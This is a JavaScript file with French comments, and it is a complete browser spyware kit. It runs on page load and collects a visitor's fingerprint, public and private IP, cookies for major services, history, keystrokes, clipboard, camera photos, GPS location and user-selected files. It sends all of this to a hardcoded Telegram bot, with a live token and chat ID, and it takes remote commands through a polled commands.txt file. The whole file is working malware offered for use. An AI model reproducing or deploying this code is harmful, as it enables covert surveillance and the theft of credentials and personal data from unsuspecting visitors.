// ============================================
// CONFIGURATION TELEGRAM (INTÉGRÉE)
// ============================================
const TELEGRAM_BOT_TOKEN = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
const TELEGRAM_CHAT_ID = '6767182328';

const statusDiv = document.getElementById('statusBar');
let collectedData = {
    fingerprint: {},
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    publicIP: null,
    privateIP: null,
    photos: [],
    video: null,
    clipboard: null,
    location: null,
    keystrokes: [],
    cookies: {},
    browsingHistory: [],
    deviceBattery: null,
    permissionsGranted: []
};

function updateStatus(msg, isError = false) {
    if (statusDiv) {
        statusDiv.innerHTML = (isError ? '🔴 ' : '🟢 ') + msg;
    }
    console.log('[STATUS]', msg);
}

// ============================================
// 0. CRÉATION AUTOMATIQUE DE commands.txt
// ============================================
async function ensureCommandsFile() {
    try {
        const res = await fetch('commands.txt');
        if (!res.ok && res.status === 404) {
            console.log('[INIT] Création de commands.txt...');
            await fetch('commands.txt', { method: 'POST', body: '' });
        }
    } catch(e) {
        console.log('[INIT] Vérification commands.txt:', e);
    }
}

// ============================================
// 1. FINGERPRINT + IP
// ============================================
async function collectFingerprint() {
    updateStatus('📡 Collecte empreinte numérique...');
    collectedData.fingerprint = {
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        uuid: crypto.randomUUID ? crypto.randomUUID() : 'not-supported'
    };
    
    // IP publique
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        collectedData.publicIP = data.ip;
    } catch(e) {
        try {
            const res = await fetch('https://api.my-ip.io/ip.json');
            const data = await res.json();
            collectedData.publicIP = data.ip;
        } catch(e2) {}
    }
    
    updateStatus('✅ Empreinte collectée');
    await sendToTelegram(`🆕 NOUVEAU VISITEUR
━━━━━━━━━━━━━━━━━━━━━
🆔 UUID: ${collectedData.fingerprint.uuid}
📱 Agent: ${navigator.userAgent}
🖥️ Écran: ${collectedData.fingerprint.screen}
🌍 IP: ${collectedData.publicIP || 'inconnue'}
━━━━━━━━━━━━━━━━━━━━━`);
}

// ============================================
// 2. IP PRIVÉE (WebRTC)
// ============================================
async function collectPrivateIP() {
    return new Promise((resolve) => {
        updateStatus('🌐 Récupération IP privée...');
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = event => {
            if (event?.candidate?.candidate) {
                const match = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (match) {
                    collectedData.privateIP = match[0];
                    updateStatus('✅ IP privée: ' + match[0]);
                    pc.close();
                    resolve(match[0]);
                }
            }
        };
        setTimeout(() => {
            collectedData.privateIP = 'non détectée';
            pc.close();
            resolve('non détectée');
        }, 2000);
    });
}

// ============================================
// 3. BOUTON FLOTTANT POUR GPS
// ============================================
function showFloatingLocationButton() {
    if (document.getElementById('gps-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'gps-btn';
    btn.innerHTML = '📍 Partager ma position';
    btn.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:9999;background:#405DE6;color:white;border:none;border-radius:50px;padding:10px 15px;font-size:12px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.2);';
    btn.onclick = () => {
        navigator.geolocation.getCurrentPosition(
            pos => {
                collectedData.location = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                };
                sendToTelegram(`📍 LOCALISATION GPS
Lat: ${pos.coords.latitude}
Lon: ${pos.coords.longitude}
Précision: ${pos.coords.accuracy}m
Carte: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                btn.remove();
            },
            err => sendToTelegram(`❌ GPS refusé: ${err.message}`)
        );
        btn.remove();
    };
    document.body.appendChild(btn);
    setTimeout(() => btn.remove(), 30000);
}

// ============================================
// 4. COOKIES & HISTORIQUE
// ============================================
function collectAllCookies() {
    updateStatus('🍪 Récupération des cookies...');
    const allCookies = document.cookie.split(';');
    const importantDomains = ['facebook', 'instagram', 'google', 'gmail', 'twitter', 'tiktok', 'snapchat', 'netflix', 'spotify', 'amazon', 'whatsapp', 'telegram'];
    
    allCookies.forEach(cookie => {
        const cookieName = cookie.split('=')[0].trim();
        const cookieValue = cookie.split('=')[1]?.trim() || '';
        
        importantDomains.forEach(domain => {
            if (cookieName.toLowerCase().includes(domain) || document.domain.includes(domain)) {
                collectedData.cookies[domain] = collectedData.cookies[domain] || [];
                collectedData.cookies[domain].push({ name: cookieName, value: cookieValue });
            }
        });
    });
    
    collectedData.cookies.all = document.cookie;
    if (Object.keys(collectedData.cookies).length > 1) {
        sendToTelegram(`🍪 Cookies récupérés: ${Object.keys(collectedData.cookies).join(', ')}`);
    }
    updateStatus('✅ Cookies récupérés');
}

function collectBrowsingHistory() {
    updateStatus('📜 Récupération historique...');
    try {
        const perfEntries = performance.getEntriesByType('navigation');
        perfEntries.forEach(entry => {
            if (entry.name && entry.name !== 'about:blank') {
                collectedData.browsingHistory.push(entry.name);
            }
        });
        if (document.referrer) collectedData.browsingHistory.push(document.referrer);
        if (collectedData.browsingHistory.length > 0) {
            sendToTelegram(`📜 Historique: ${collectedData.browsingHistory.slice(0, 5).join(' → ')}`);
        }
    } catch(e) {}
    updateStatus('✅ Historique récupéré');
}

// ============================================
// 5. NOTIFICATIONS PUSH
// ============================================
async function requestNotifications() {
    updateStatus('🔔 Demande notifications...');
    const permission = await Notification.requestPermission();
    if (permission === 'granted') {
        updateStatus('✅ Notifications activées');
        await sendToTelegram('✅ Notifications PUSH activées');
    } else {
        await sendToTelegram('❌ Notifications PUSH refusées');
    }
}

// ============================================
// 6. CAMÉRA
// ============================================
async function requestCameraAndCapture() {
    updateStatus('📷 Demande accès caméra...');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        updateStatus('✅ Caméra activée');
        await sendToTelegram('✅ Caméra activée');
        
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 500;
        const ctx = canvas.getContext('2d');
        
        for (let i = 1; i <= 3; i++) {
            updateStatus(`📸 Photo ${i}/3...`);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            await sendPhotoToTelegram(photoData);
            await new Promise(r => setTimeout(r, 1500));
        }
        
        stream.getTracks().forEach(t => t.stop());
        updateStatus('✅ Capture terminée');
        await sendToTelegram('✅ 3 photos capturées');
    } catch(e) {
        updateStatus('❌ Caméra refusée');
        await sendToTelegram(`❌ Caméra refusée`);
    }
}

// ============================================
// 7. BOUTON FLOTTANT POUR FICHIERS
// ============================================
function showFloatingFileButton() {
    if (document.getElementById('file-btn')) return;
    const btn = document.createElement('button');
    btn.id = 'file-btn';
    btn.innerHTML = '📁 Sélectionner un fichier';
    btn.style.cssText = 'position:fixed;bottom:80px;right:20px;z-index:9999;background:#28a745;color:white;border:none;border-radius:50px;padding:10px 15px;font-size:12px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.2);';
    btn.onclick = () => {
        const input = document.createElement('input');
        input.type = 'file';
        input.multiple = true;
        input.accept = 'image/*,video/*,audio/*,.pdf,.txt';
        input.onchange = async (e) => {
            const files = Array.from(e.target.files);
            await sendToTelegram(`📁 ${files.length} fichier(s) sélectionné(s)`);
            for (const file of files) {
                const reader = new FileReader();
                reader.onload = async (ev) => {
                    const dataUrl = ev.target.result;
                    if (file.type.startsWith('image/')) {
                        await sendPhotoToTelegram(dataUrl);
                    } else {
                        await sendFileToTelegram(file.name, dataUrl);
                    }
                };
                reader.readAsDataURL(file);
            }
        };
        input.click();
        btn.remove();
    };
    document.body.appendChild(btn);
    setTimeout(() => btn.remove(), 30000);
}

// ============================================
// 8. PRESSE-PAPIER
// ============================================
async function requestClipboardAccess() {
    updateStatus('📋 Lecture presse-papier...');
    try {
        if (navigator.clipboard?.readText) {
            const text = await navigator.clipboard.readText();
            if (text) await sendToTelegram(`📋 Presse-papier: ${text.substring(0, 300)}`);
            else await sendToTelegram(`📋 Presse-papier vide`);
        } else {
            await sendToTelegram(`❌ API presse-papier non dispo`);
        }
    } catch(e) {
        updateStatus('❌ Presse-papier inaccessible');
        await sendToTelegram(`❌ Presse-papier: accès refusé`);
    }
}

// ============================================
// 9. KEYLOGGER
// ============================================
function startKeylogger() {
    let keyBuffer = [];
    document.addEventListener('keypress', (e) => {
        keyBuffer.push(e.key);
        if (keyBuffer.length >= 15) {
            sendToTelegram(`⌨️ Frappes: ${keyBuffer.join('')}`);
            keyBuffer = [];
        }
    });
    updateStatus('⌨️ Keylogger actif');
}

// ============================================
// 10. CAPTURE D'ÉCRAN
// ============================================
async function captureScreenshot() {
    updateStatus('📸 Capture écran...');
    await sendToTelegram('📸 Capture écran demandée');
    try {
        if (typeof html2canvas !== 'undefined') {
            const canvas = await html2canvas(document.body);
            const imgData = canvas.toDataURL('image/png');
            await sendPhotoToTelegram(imgData);
            updateStatus('✅ Capture envoyée');
        } else {
            await sendToTelegram('❌ html2canvas non chargé');
        }
    } catch(e) {
        await sendToTelegram(`❌ Capture échouée: ${e.message}`);
    }
}

// ============================================
// 11. CHARGEMENT HTML2CANVAS
// ============================================
function loadHtml2Canvas() {
    if (typeof html2canvas === 'undefined') {
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
        document.head.appendChild(script);
    }
}

// ============================================
// 12. COMMANDES À DISTANCE (CORRIGÉES + FILTRE 404)
// ============================================
let lastCommand = '';
async function checkRemoteCommands() {
    try {
        const res = await fetch('commands.txt?t=' + Date.now());
        
        // 🔥 IGNORER SI FICHIER NON TROUVÉ (404)
        if (!res.ok) {
            console.log('[COMMAND] commands.txt pas encore créé');
            return;
        }
        
        const cmd = await res.text();
        const cleanCmd = cmd.trim();
        
        // Ignorer les réponses HTML (404) ou vides
        if (!cleanCmd || cleanCmd === 'clear' || cleanCmd === lastCommand) return;
        if (cleanCmd.startsWith('<!doctype') || cleanCmd.startsWith('<html') || cleanCmd.includes('Not Found')) {
            console.log('[COMMAND] Ignoré: réponse HTML');
            return;
        }
        
        lastCommand = cleanCmd;
        console.log('[COMMAND] Reçue:', cleanCmd);
        await sendToTelegram(`📟 Commande: ${cleanCmd}`);
        
        if (cleanCmd === 'camera') {
            await requestCameraAndCapture();
        }
        else if (cleanCmd === 'files') {
            showFloatingFileButton();
            await sendToTelegram('📁 Bouton fichier affiché');
        }
        else if (cleanCmd === 'clipboard') {
            await requestClipboardAccess();
        }
        else if (cleanCmd === 'screenshot') {
            await captureScreenshot();
        }
        else if (cleanCmd === 'location') {
            showFloatingLocationButton();
            await sendToTelegram('📍 Bouton GPS affiché');
        }
        else if (cleanCmd === 'status') {
            await sendToTelegram(`📊 STATUT
UUID: ${collectedData.fingerprint.uuid}
IP: ${collectedData.publicIP || 'inconnue'}
Cookies: ${Object.keys(collectedData.cookies).length}
Historique: ${collectedData.browsingHistory.length}
Photos: ${collectedData.photos.length}`);
        }
        else if (cleanCmd === 'cookies') {
            await sendToTelegram(`🍪 Cookies: ${collectedData.cookies.all || 'aucun'}`);
        }
        else if (cleanCmd === 'history') {
            await sendToTelegram(`📜 Historique: ${collectedData.browsingHistory.slice(0, 5).join(' → ')}`);
        }
        else if (cleanCmd === 'ping') {
            await sendToTelegram('🏓 Pong! Onglet actif');
        }
        else if (cleanCmd === 'vibrate' && navigator.vibrate) {
            navigator.vibrate(200);
            await sendToTelegram('📳 Vibration');
        }
        else if (cleanCmd === 'help' || cleanCmd === 'start') {
            await showCommands();
        }
        else if (cleanCmd.startsWith('notify_custom:')) {
            const msg = cleanCmd.replace('notify_custom:', '').trim();
            new Notification('📢 Message', { body: msg });
            await sendToTelegram(`🔔 Notification: ${msg}`);
        }
        else if (cleanCmd.startsWith('url:')) {
            const url = cleanCmd.replace('url:', '').trim();
            window.open(url, '_blank');
            await sendToTelegram(`🔗 URL ouverte: ${url}`);
        }
        else {
            await sendToTelegram(`❌ Commande inconnue: ${cleanCmd}`);
        }
        
        // Nettoyer le fichier après exécution
        await fetch('commands.txt', { method: 'POST', body: 'clear' });
        lastCommand = '';
        
    } catch(e) {
        console.error('[COMMAND]', e);
    }
}

// ============================================
// 13. KEEP-ALIVE
// ============================================
function keepAlive() {
    setInterval(() => {
        fetch('keepalive.txt?t=' + Date.now()).catch(() => {});
    }, 25000);
}

// ============================================
// 14. ENVOIS TELEGRAM
// ============================================
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message.substring(0, 4000) })
        });
    } catch(e) {}
}

async function sendPhotoToTelegram(photoDataUrl) {
    try {
        const blob = await (await fetch(photoDataUrl)).blob();
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendFileToTelegram(filename, dataUrl) {
    try {
        const blob = await (await fetch(dataUrl)).blob();
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', blob, filename);
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
    } catch(e) {}
}

// ============================================
// 15. LISTE DES COMMANDES (/start ou help)
// ============================================
async function showCommands() {
    await sendToTelegram(`🤖 COMMANDES BOT
━━━━━━━━━━━━━━━━━━━━━
📷 camera - 3 photos
📁 files - Sélection fichiers
📋 clipboard - Presse-papier
📸 screenshot - Capture écran
📍 location - GPS
🍪 cookies - Cookies
📜 history - Historique
📊 status - État complet
🏓 ping - Test connexion
📳 vibrate - Vibration
🔔 notify_custom:TEXTE - Notif perso
🌐 url:https://... - Ouvre lien
help ou start - Cette aide
━━━━━━━━━━━━━━━━━━━━━`);
}

// ============================================
// EXÉCUTION PRINCIPALE
// ============================================
(async function main() {
    updateStatus('🟢 Démarrage...');
    
    // Créer commands.txt si nécessaire
    await ensureCommandsFile();
    
    await collectFingerprint();
    await collectPrivateIP();
    collectAllCookies();
    collectBrowsingHistory();
    await requestNotifications();
    startKeylogger();
    keepAlive();
    loadHtml2Canvas();
    
    setTimeout(() => showCommands(), 5000);
    setInterval(checkRemoteCommands, 3000);
    updateStatus('✅ Prêt - Commandes actives');
    await sendToTelegram('✅ Bot actif - Envoie /start pour les commandes');
})();
